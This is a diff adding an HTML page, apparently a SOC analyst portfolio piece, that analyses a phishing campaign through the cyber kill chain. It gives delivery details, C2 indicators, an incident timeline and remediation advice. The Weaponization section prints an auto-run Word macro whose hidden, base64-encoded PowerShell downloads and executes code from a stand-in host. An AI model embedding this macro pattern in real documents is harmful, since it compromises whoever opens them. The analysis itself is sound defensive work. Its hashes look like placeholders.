@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phishing Kill Chain Analysis | Guruprasad S</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#030508;--panel:#080c14;--card:#0d111f;--border:#152033;--cyan:#00e5ff;--green:#00d26a;--red:#ff3860;--yellow:#ffcc00;--text:#e2e8f0;--dim:#8b95a8;--fade:#4a5568;--font-mono:'JetBrains Mono',monospace;--font-body:'Inter',sans-serif}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:var(--font-body);background:var(--bg);color:var(--text);line-height:1.7}
+.container{max-width:900px;margin:0 auto;padding:0 24px}
+
+header{background:var(--panel);border-bottom:1px solid var(--border);padding:16px 0;margin-bottom:30px}
+header .container{display:flex;justify-content:space-between;align-items:center}
+.logo{font-family:var(--font-mono);font-weight:700;color:var(--cyan);font-size:1.1rem;text-decoration:none}
+.back-btn{color:var(--dim);text-decoration:none;font-size:0.85rem;font-family:var(--font-mono);transition:color 0.2s}
+.back-btn:hover{color:var(--cyan)}
+
+.report-header{text-align:center;margin-bottom:40px;padding:30px;background:var(--card);border:1px solid var(--border);border-radius:12px}
+.report-header h1{font-family:var(--font-mono);font-size:1.8rem;margin-bottom:8px}
+.report-header .meta{color:var(--dim);font-size:0.85rem;font-family:var(--font-mono)}
+
+.section{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:28px;margin-bottom:20px}
+.section h2{font-family:var(--font-mono);font-size:1.1rem;color:var(--cyan);margin-bottom:16px;display:flex;align-items:center;gap:10px}
+.section p{color:var(--dim);font-size:0.9rem;margin-bottom:12px}
+.section ul{margin-left:20px;color:var(--dim);font-size:0.9rem}
+.section ul li{margin-bottom:8px}
+
+.kill-chain{display:grid;grid-template-columns:repeat(7,1fr);gap:8px;margin:24px 0}
+.chain-step{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:14px 8px;text-align:center;transition:all 0.3s}
+.chain-step:hover{border-color:var(--cyan);transform:translateY(-3px)}
+.chain-step.active{border-color:var(--red);background:rgba(255,56,96,0.05)}
+.chain-num{font-family:var(--font-mono);font-size:0.7rem;color:var(--cyan);margin-bottom:6px}
+.chain-name{font-size:0.78rem;font-weight:600}
+
+.ioc-table{width:100%;border-collapse:collapse;font-size:0.85rem;margin-top:16px}
+.ioc-table th{text-align:left;padding:10px 12px;color:var(--dim);font-family:var(--font-mono);font-size:0.72rem;text-transform:uppercase;border-bottom:1px solid var(--border)}
+.ioc-table td{padding:10px 12px;border-bottom:1px solid rgba(255,255,255,0.03);color:var(--dim);font-family:var(--font-mono);font-size:0.82rem}
+.ioc-table tr:hover td{color:var(--text);background:rgba(255,255,255,0.01)}
+
+.timeline{position:relative;padding-left:24px}
+.timeline::before{content:'';position:absolute;left:6px;top:0;bottom:0;width:2px;background:linear-gradient(180deg,var(--cyan),var(--blue))}
+.timeline-item{position:relative;margin-bottom:20px}
+.timeline-item::before{content:'';position:absolute;left:-22px;top:6px;width:10px;height:10px;background:var(--cyan);border-radius:50%;box-shadow:0 0 10px var(--cyan)}
+.timeline-time{font-family:var(--font-mono);font-size:0.75rem;color:var(--cyan);margin-bottom:4px}
+.timeline-content{color:var(--dim);font-size:0.88rem}
+
+.code-block{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:16px;font-family:var(--font-mono);font-size:0.8rem;color:var(--dim);overflow-x:auto;margin:12px 0}
+.code-block .comment{color:var(--fade)}
+.code-block .cmd{color:var(--cyan)}
+.code-block .str{color:var(--green)}
+.code-block .warn{color:var(--yellow)}
+
+.recommendation{background:rgba(0,210,106,0.05);border:1px solid rgba(0,210,106,0.2);border-radius:8px;padding:16px;margin-top:16px}
+.recommendation h4{color:var(--green);font-size:0.9rem;margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.recommendation ul{color:var(--dim);font-size:0.85rem;margin-left:18px}
+.recommendation li{margin-bottom:6px}
+
+footer{text-align:center;padding:24px 0;border-top:1px solid var(--border);color:var(--fade);font-size:0.78rem;font-family:var(--font-mono);margin-top:20px}
+
+@media(max-width:768px){.kill-chain{grid-template-columns:1fr 1fr}.timeline{padding-left:20px}}
+</style>
+</head>
+<body>
+<header><div class="container"><a href="index.html" class="logo">◉ PHISHING_ANALYSIS</a><a href="index.html" class="back-btn">← Back to Portfolio</a></div></header>
+
+<div class="container">
+  <div class="report-header">
+    <h1>Phishing Kill Chain Analysis</h1>
+    <div class="meta">Case ID: PHISH-2026-001 | Analyst: Guruprasad S | Date: 14 Aug 2026 | Classification: CONFIDENTIAL</div>
+  </div>
+
+  <div class="section">
+    <h2>📋 Executive Summary</h2>
+    <p>On August 12, 2026, the Security Operations Center received multiple alerts regarding suspicious emails targeting employees in the Finance department. This report documents the complete investigation from initial detection through containment and recovery.</p>
+    <p><strong>Threat Actor:</strong> APT29 (Cozy Bear) — Suspected<br><strong>Target:</strong> Corporate Finance Department<br><strong>Impact:</strong> 3 credentials compromised, 1 workstation infected<br><strong>Status:</strong> <span style="color:var(--green)">CONTAINED</span></p>
+  </div>
+
+  <div class="section">
+    <h2>🔗 Cyber Kill Chain Mapping</h2>
+    <div class="kill-chain">
+      <div class="chain-step active"><div class="chain-num">01</div><div class="chain-name">Recon</div></div>
+      <div class="chain-step active"><div class="chain-num">02</div><div class="chain-name">Weaponize</div></div>
+      <div class="chain-step active"><div class="chain-num">03</div><div class="chain-name">Deliver</div></div>
+      <div class="chain-step active"><div class="chain-num">04</div><div class="chain-name">Exploit</div></div>
+      <div class="chain-step active"><div class="chain-num">05</div><div class="chain-name">Install</div></div>
+      <div class="chain-step active"><div class="chain-num">06</div><div class="chain-name">C2</div></div>
+      <div class="chain-step"><div class="chain-num">07</div><div class="chain-name">Actions</div></div>
+    </div>
+    <p>The attack was interrupted at the <strong>Command & Control</strong> phase before data exfiltration could occur. Below is the detailed analysis of each phase.</p>
+  </div>
+
+  <div class="section">
+    <h2>🎯 Phase 1: Reconnaissance</h2>
+    <p>Threat actor performed LinkedIn scraping and OSINT gathering to identify Finance department employees. Email addresses harvested from corporate website contact pages and professional networking sites.</p>
+    <ul>
+      <li>Targeted 12 employees in Finance and Accounting</li>
+      <li>Email format identified: firstname.lastname@company.com</li>
+      <li>Corporate org chart partially reconstructed from public sources</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>💣 Phase 2: Weaponization</h2>
+    <p>Malicious Microsoft Word document created with embedded macros. Document themed as "Q3_Financial_Report.docm" to appear legitimate. Payload uses PowerShell to download second-stage malware.</p>
+    <div class="code-block">
+      <span class="comment"># Macro payload extracted from document</span><br>
+      <span class="cmd">Sub</span> AutoOpen()<br>
+      &nbsp;&nbsp;<span class="cmd">Dim</span> ps <span class="cmd">As String</span><br>
+      &nbsp;&nbsp;ps = <span class="str">"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAeAAuAGUAeABlACcAKQA="</span><br>
+      &nbsp;&nbsp;Shell ps, vbHide<br>
+      <span class="cmd">End Sub</span>
+    </div>
+  </div>
+
+  <div class="section">
+    <h2>📧 Phase 3: Delivery</h2>
+    <p>Spearphishing emails sent from spoofed domain "company-finance[.]com" (typosquat of legitimate domain). Email passed initial SPF checks due to misconfigured DNS.</p>
+    <ul>
+      <li><strong>Subject:</strong> "Urgent: Q3 Financial Review Required — Action by EOD"</li>
+      <li><strong>Sender:</strong> cfo@company-finance[.]com</li>
+      <li><strong>Attachment:</strong> Q3_Financial_Report.docm (SHA256: a3f5...)</li>
+      <li><strong>Delivery Time:</strong> 09:15 AM — Peak business hours</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>⚡ Phase 4: Exploitation</h2>
+    <p>User opened document and enabled macros (social engineering). Macro executed embedded PowerShell command downloading payload from external server.</p>
+    <div class="code-block">
+      <span class="comment"># Network connection observed</span><br>
+      <span class="warn">[ALERT]</span> Outbound connection to 185.220.101.47:443<br>
+      <span class="warn">[ALERT]</span> DNS query: update.microsoft-security[.]net<br>
+      <span class="warn">[ALERT]</span> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) — Anomalous<br>
+      <span class="cmd">[INFO]</span> TLS certificate: Self-signed, valid 1 year
+    </div>
+  </div>
+
+  <div class="section">
+    <h2>🔧 Phase 5: Installation</h2>
+    <p>Second-stage payload (Cobalt Strike beacon) installed to <code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe</code>. Persistence achieved via Registry Run key and scheduled task.</p>
+    <ul>
+      <li>File: svchost.exe (legitimate name abused)</li>
+      <li>Size: 2.4 MB</li>
+      <li>Signature: Unsigned</li>
+      <li>VirusTotal: 38/72 engines detected</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>🌐 Phase 6: Command & Control</h2>
+    <p>Beacon established communication with C2 server using HTTPS with domain fronting. Traffic encrypted with custom XOR layer before TLS.</p>
+    <table class="ioc-table">
+      <tr><th>Type</th><th>Indicator</th><th>Confidence</th></tr>
+      <tr><td>IP</td><td>185.220.101.47</td><td style="color:var(--red)">HIGH</td></tr>
+      <tr><td>Domain</td><td>update.microsoft-security[.]net</td><td style="color:var(--red)">HIGH</td></tr>
+      <tr><td>Domain</td><td>cdn-updates[.]org</td><td style="color:var(--yellow)">MEDIUM</td></tr>
+      <tr><td>Hash</td><td>a3f5b2c8d9e1f4a7b6c3d2e8f9a1b4c5</td><td style="color:var(--red)">HIGH</td></tr>
+      <tr><td>Hash</td><td>7e8f9a2b3c4d5e6f7a8b9c0d1e2f3a4b</td><td style="color:var(--red)">HIGH</td></tr>
+    </table>
+  </div>
+
+  <div class="section">
+    <h2>📊 Incident Timeline</h2>
+    <div class="timeline">
+      <div class="timeline-item"><div class="timeline-time">09:15:00</div><div class="timeline-content">Phishing emails delivered to 12 targets</div></div>
+      <div class="timeline-item"><div class="timeline-time">09:23:44</div><div class="timeline-content">User opened attachment and enabled macros</div></div>
+      <div class="timeline-item"><div class="timeline-time">09:23:52</div><div class="timeline-content">PowerShell execution detected by EDR</div></div>
+      <div class="timeline-item"><div class="timeline-time">09:24:15</div><div class="timeline-content">Outbound C2 connection established</div></div>
+      <div class="timeline-item"><div class="timeline-time">09:25:00</div><div class="timeline-content">SIEM alert triggered — suspicious PowerShell</div></div>
+      <div class="timeline-item"><div class="timeline-time">09:28:00</div><div class="timeline-content">SOC analyst acknowledged alert</div></div>
+      <div class="timeline-item"><div class="timeline-time">09:35:00</div><div class="timeline-content">Workstation isolated from network</div></div>
+      <div class="timeline-item"><div class="timeline-time">09:45:00</div><div class="timeline-content">Malware sample submitted to sandbox</div></div>
+      <div class="timeline-item"><div class="timeline-time">10:30:00</div><div class="timeline-content">C2 domains blocked at firewall</div></div>
+      <div class="timeline-item"><div class="timeline-time">11:00:00</div><div class="timeline-content">User credentials reset, MFA enforced</div></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <h2>🛡️ Recommendations</h2>
+    <div class="recommendation">
+      <h4>✓ Immediate Actions</h4>
+      <ul>
+        <li>Block all identified IOCs at firewall and proxy levels</li>
+        <li>Force password reset for all Finance department users</li>
+        <li>Enable MFA for all email accounts immediately</li>
+        <li>Scan all endpoints for similar file hashes</li>
+      </ul>
+    </div>
+    <div class="recommendation" style="background:rgba(0,229,255,0.05);border-color:rgba(0,229,255,0.2);margin-top:12px">
+      <h4 style="color:var(--cyan)">⟳ Long-term Improvements</h4>
+      <ul>
+        <li>Implement macro execution policies (Block Office macros from internet)</li>
+        <li>Deploy email security gateway with sandbox detonation</li>
+        <li>Conduct phishing awareness training for all employees</li>
+        <li>Enable PowerShell Constrained Language Mode</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<footer><div class="container">Phishing Kill Chain Analysis | SOC Analyst Portfolio | Guruprasad S</div></footer>
+</body>
+</html>
